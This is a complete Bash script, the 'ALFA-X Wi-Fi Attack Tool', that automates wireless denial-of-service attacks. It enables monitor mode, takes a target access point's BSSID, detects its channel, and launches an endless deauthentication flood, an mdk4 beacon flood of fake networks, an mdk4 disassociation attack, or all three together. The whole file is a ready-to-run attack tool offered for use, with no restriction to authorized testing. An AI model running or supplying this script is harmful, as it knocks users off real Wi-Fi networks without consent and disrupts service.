#!/bin/bash

title="\e[1;32m╔════════════════════════════════════════════╗
║             ALFA-X Wi-Fi Attack Tool        ║
║        Fully Automated – by Yassin 🧠        ║
╚════════════════════════════════════════════╝\e[0m"

echo -e "$title"

# 0. Check for root
if [ "$EUID" -ne 0 ]; then
  echo -e "\e[1;31m[!] Please run as root.\e[0m"
  exit 1
fi

# 1. Dependencies
for tool in aircrack-ng mdk4 xterm iw ifconfig; do
    if ! command -v $tool &> /dev/null; then
        echo -e "\e[1;31m[!] Missing: $tool\e[0m"
        exit 1
    fi
done

# 2. Detect Alfa interface
iface=$(iw dev | grep Interface | awk '{print $2}' | grep -E 'wlan[0-9]' | head -n1)

if [[ -z "$iface" ]]; then
  echo -e "\e[1;31m[!] No Alfa Wi-Fi interface found.\e[0m"
  exit 1
fi

echo -e "[✓] Detected interface: \e[1;36m$iface\e[0m"

# 3. Enable monitor mode
echo -e "[*] Enabling monitor mode on $iface..."
airmon-ng check kill &>/dev/null
airmon-ng start $iface &>/dev/null
iface="${iface}mon"
echo -e "[✓] Monitor mode enabled: \e[1;33m$iface\e[0m"

# Function to get channel from BSSID
function get_channel_from_bssid() {
  local bssid=$1
  echo "[*] Scanning for BSSID $bssid to find channel..."
  timeout 10 airodump-ng --bssid $bssid --write dumpfile $iface &> /dev/null
  ch=$(grep -i "$bssid" dumpfile-01.csv | awk -F ',' '{print $4}')
  echo "$ch"
}

# 4. Ask for BSSID only
read -p "[?] Enter target BSSID (MAC): " bssid

# 5. Detect channel automatically
channel=$(get_channel_from_bssid $bssid)
if [[ -z "$channel" ]]; then
  echo -e "\e[1;31m[-] Could not detect channel for $bssid\e[0m"
  read -p "Please enter channel manually: " channel
else
  echo -e "[+] Detected channel: $channel"
fi

# 6. Lock channel
iwconfig $iface channel $channel

# 7. Attack Menu
echo -e "\nChoose attack type:"
echo "[1] Deauth Attack (Kick everyone)"
echo "[2] Beacon Flood (Fake APs)"
echo "[3] MDK4 Disassociation (Disable AP)"
echo "[4] COMBO MODE (🔥 All combined)"
read -p "[?] Your choice: " atk

# 8. Create fake AP list
echo -e "FreeWiFi\nHackedZone\nSkynet\nInternet4U\nBy_Yassin" > fakeaps.txt
echo "$bssid" > dislist.txt

log="attack_log_$(date +%H%M%S).txt"

# 9. Execute attacks
case $atk in
  1)
    echo "[+] Launching Deauth Attack..."
    xterm -hold -e "aireplay-ng --deauth 0 -a $bssid $iface | tee $log"
    ;;
  2)
    echo "[+] Launching Beacon Flood..."
    mdk4 $iface b -f fakeaps.txt -s 100 | tee $log
    ;;
  3)
    echo "[+] Launching MDK4 Disassociation..."
    mdk4 $iface d -b dislist.txt -c $channel | tee $log
    ;;
  4)
    echo "[+] Launching COMBO ATTACK 💣"
    xterm -e "aireplay-ng --deauth 0 -a $bssid $iface" &
    sleep 1
    mdk4 $iface d -b dislist.txt -c $channel &
    sleep 1
    mdk4 $iface b -f fakeaps.txt -s 100 &
    wait
    ;;
  *)
    echo -e "\e[1;31m[!] Invalid choice.\e[0m"
    ;;
esac

# 10. Clean up
read -p "[?] Restore network mode (y/n)? " restore
if [[ $restore == "y" ]]; then
  airmon-ng stop $iface
  service NetworkManager restart
  echo -e "[*] Interface restored."
fi

echo -e "\n[✓] Log saved to: $log"
